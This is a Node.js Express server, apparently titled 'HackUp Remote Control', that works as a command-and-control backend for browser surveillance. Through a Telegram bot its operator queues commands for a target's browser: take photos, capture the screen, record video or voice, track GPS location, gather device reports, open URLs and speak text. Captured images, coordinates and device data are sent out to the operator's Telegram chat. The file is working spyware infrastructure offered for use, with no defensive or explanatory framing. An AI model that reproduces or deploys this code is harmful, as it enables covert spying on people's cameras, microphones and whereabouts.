require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(cors());
app.use(express.json({ limit: '5mb' }));
app.use(express.urlencoded({ extended: true, limit: '5mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ---------- state ----------
const cmdQueue = [];        // Telegram → Browser commands
const cmdResults = {};      // Browser → Server results
let lastBrowserPing = 0;
const logs = [];

const tgReady = () => Boolean(BOT_TOKEN && CHAT_ID);
const tgUrl = (m) => `https://api.telegram.org/bot${BOT_TOKEN}/${m}`;
const TG_TIMEOUT = 8000;

// ---------- helpers ----------
function log(msg) {
  const e = { msg, ts: new Date().toISOString() };
  logs.unshift(e);
  if (logs.length > 100) logs.pop();
  console.log('[HackUp]', msg);
}

async function tgSend(text) {
  if (!tgReady()) throw new Error('Telegram credentials missing');
  const r = await axios.post(tgUrl('sendMessage'), {
    chat_id: CHAT_ID,
    text: String(text).slice(0, 4000),
    parse_mode: 'HTML',
    disable_web_page_preview: true
  }, { timeout: TG_TIMEOUT });
  return r.data;
}

async function tgSendPhoto(dataUrl, caption) {
  if (!tgReady()) throw new Error('Telegram credentials missing');
  const m = /^data:([^;]+);base64,(.+)$/.exec(dataUrl || '');
  if (!m) throw new Error('Invalid image');
  const mime = m[1];
  const buf = Buffer.from(m[2], 'base64');
  if (buf.length > 4.5 * 1024 * 1024) throw new Error('Image >4.5MB');

  const boundary = '----hackup' + Date.now();
  const parts = [];
  const push = s => parts.push(Buffer.from(s, 'utf8'));
  push(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}\r\n`);
  push(`--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${(caption || '📸 Capture').slice(0,1000)}\r\n`);
  push(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="capture.jpg"\r\nContent-Type: ${mime}\r\n\r\n`);
  parts.push(buf);
  push(`\r\n--${boundary}--\r\n`);
  const body = Buffer.concat(parts);

  const r = await axios.post(tgUrl('sendPhoto'), body, {
    headers: {
      'Content-Type': `multipart/form-data; boundary=${boundary}`,
      'Content-Length': body.length
    },
    timeout: TG_TIMEOUT, maxBodyLength: Infinity, maxContentLength: Infinity
  });
  return r.data;
}

async function tgSendLocation(lat, lon) {
  if (!tgReady()) throw new Error('Telegram credentials missing');
  const r = await axios.post(tgUrl('sendLocation'), {
    chat_id: CHAT_ID, latitude: lat, longitude: lon
  }, { timeout: TG_TIMEOUT });
  return r.data;
}

// ---------- routes ----------
app.get('/api/health', (_, res) => {
  res.json({
    ok: true,
    telegramConfigured: tgReady(),
    browserOnline: Date.now() - lastBrowserPing < 20000,
    queued: cmdQueue.length,
    uptime: process.uptime()
  });
});

// Browser → server: receive command results + optionally forward to TG
app.post('/api/commands/result', async (req, res) => {
  const { id, result, forward } = req.body || {};
  if (id) cmdResults[id] = { result, ts: Date.now() };
  if (forward && result) {
    try { await tgSend(result); } catch {}
  }
  res.json({ ok: true });
});

// Browser → server: poll for commands
app.get('/api/commands/poll', (_, res) => {
  lastBrowserPing = Date.now();
  const cmds = cmdQueue.splice(0, cmdQueue.length);
  res.json({ commands: cmds, ok: true });
});

// Browser → server: upload photo
app.post('/api/upload', async (req, res) => {
  try {
    const { image, caption } = req.body || {};
    if (!image) return res.status(400).json({ error: 'image required' });
    const r = await tgSendPhoto(image, caption);
    res.json({ success: r.ok === true });
  } catch (e) {
    console.error('upload', e.message);
    res.status(500).json({ error: e.message });
  }
});

// Browser → server: location
app.post('/api/telegram/location', async (req, res) => {
  try {
    const { latitude, longitude, caption } = req.body || {};
    if (typeof latitude !== 'number' || typeof longitude !== 'number')
      return res.status(400).json({ error: 'lat/lon required' });
    const maps = `https://maps.google.com/?q=${latitude},${longitude}`;
    await tgSend(
      `${caption || '📍 Location'}\n` +
      `Lat: <code>${latitude.toFixed(6)}</code>\n` +
      `Lon: <code>${longitude.toFixed(6)}</code>\n` +
      `<a href="${maps}">🗺️ Open Maps</a>`
    );
    await tgSendLocation(latitude, longitude);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Browser → server: text message
app.post('/api/telegram/message', async (req, res) => {
  try {
    const r = await tgSend(req.body.text || '');
    res.json({ success: r.ok === true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Browser → server: report (key-value)
app.post('/api/telegram/report', async (req, res) => {
  try {
    const d = req.body || {};
    const lines = ['📊 <b>Device Report</b>', `<b>Time:</b> ${new Date().toLocaleString()}`, ''];
    Object.keys(d).forEach(k => {
      let v = d[k];
      if (v === null || v === undefined || v === '') return;
      if (typeof v === 'object') v = JSON.stringify(v);
      lines.push(`<b>${k}:</b> <code>${String(v).slice(0,500)}</code>`);
    });
    const r = await tgSend(lines.join('\n'));
    res.json({ success: r.ok === true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ---------- Telegram webhook ----------
app.post('/api/telegram/webhook', async (req, res) => {
  try {
    const msg = req.body?.message;
    if (!msg || !msg.text) return res.json({ ok: true });
    const text = msg.text.trim();
    const fromId = String(msg.chat.id);
    if (CHAT_ID && fromId !== String(CHAT_ID)) return res.json({ ok: true });

    const queue = (cmd) => {
      const id = Date.now().toString(36) + Math.random().toString(36).slice(2,6);
      cmdQueue.push({ id, cmd, ts: Date.now() });
      log(`Queued: ${JSON.stringify(cmd)}`);
      return id;
    };

    if (text === '/start' || text === '/help') {
      await tgSend(
        '🤖 <b>HackUp Remote Control</b>\n' +
        '━━━━━━━━━━━━━━━━━━━━━━\n' +
        '📷 <b>Camera:</b>\n' +
        '/photo — Take photo\n' +
        '/screen — Screen capture\n' +
        '/record3 — 3s video\n' +
        '/record5 — 5s voice\n\n' +
        '📍 <b>Location:</b>\n' +
        '/location — GPS location\n' +
        '/track — 30s live track\n\n' +
        '📊 <b>Device Info:</b>\n' +
        '/report — Full device report\n' +
        '/battery — Battery status\n' +
        '/network — Network info\n' +
        '/sensors — Orientation/motion\n' +
        '/storage — Storage quota\n\n' +
        '🎮 <b>Control:</b>\n' +
        '/vibrate — Vibrate device\n' +
        '/say &lt;text&gt; — Speak text\n' +
        '/open &lt;url&gt; — Open URL\n' +
        '/fullscreen — Fullscreen\n' +
        '/notify &lt;msg&gt; — Show notification\n\n' +
        '🔄 <b>Status:</b>\n' +
        '/status — Browser online?\n' +
        '/logs — Server logs'
      );
    }
    else if (text === '/status') {
      const alive = Date.now() - lastBrowserPing < 20000;
      await tgSend(`📡 Browser: ${alive ? '🟢 Online' : '🔴 Offline (browser খুলুন)'}\nQueue: ${cmdQueue.length}`);
    }
    else if (text === '/logs') {
      const recent = logs.slice(0, 10).map(l => `• ${l.msg}`).join('\n') || 'None';
      await tgSend(`<b>Logs:</b>\n${recent}`);
    }
    else if (text === '/photo') queue({ type: 'photo' });
    else if (text === '/screen') queue({ type: 'screen' });
    else if (text === '/record3') queue({ type: 'record3' });
    else if (text === '/record5') queue({ type: 'record5' });
    else if (text === '/location') queue({ type: 'location' });
    else if (text === '/track') queue({ type: 'track' });
    else if (text === '/report') queue({ type: 'report' });
    else if (text === '/battery') queue({ type: 'battery' });
    else if (text === '/network') queue({ type: 'network' });
    else if (text === '/sensors') queue({ type: 'sensors' });
    else if (text === '/storage') queue({ type: 'storage' });
    else if (text === '/vibrate') queue({ type: 'vibrate' });
    else if (text === '/fullscreen') queue({ type: 'fullscreen' });
    else if (text.startsWith('/say ')) queue({ type: 'say', text: text.slice(5) });
    else if (text.startsWith('/open ')) queue({ type: 'open', url: text.slice(6) });
    else if (text.startsWith('/notify ')) queue({ type: 'notify', text: text.slice(8) });
    else await tgSend(`❓ Unknown: ${text}\n/help দিন।`);

    // কমান্ড queue-তে গেলে confirmation
    const known = ['/photo','/screen','/record3','/record5','/location','/track','/report','/battery','/network','/sensors','/storage','/vibrate','/fullscreen'];
    if (known.includes(text) || text.startsWith('/say ') || text.startsWith('/open ') || text.startsWith('/notify ')) {
      await tgSend(`✅ Command queued: <b>${text}</b>\nBrowser আগামী কয়েক সেকেন্ডে execute করবে...`);
    }
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ---------- webhook setup ----------
app.get('/api/telegram/set-webhook', async (req, res) => {
  try {
    const host = req.query.url || `https://${req.headers.host}`;
    const wh = `${host}/api/telegram/webhook`;
    const r = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`,
      { url: wh, drop_pending_updates: true }, { timeout: TG_TIMEOUT });
    res.json({ success: true, webhook: wh, telegram: r.data });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ---------- pages ----------
app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

app.use((err, req, res, next) => {
  console.error('Error:', err.message);
  res.status(500).json({ error: err.message || 'Server error' });
});

if (require.main === module && !process.env.VERCEL) {
  app.listen(PORT, () => console.log(`🚀 HackUp → http://localhost:${PORT}`));
}
module.exports = app;
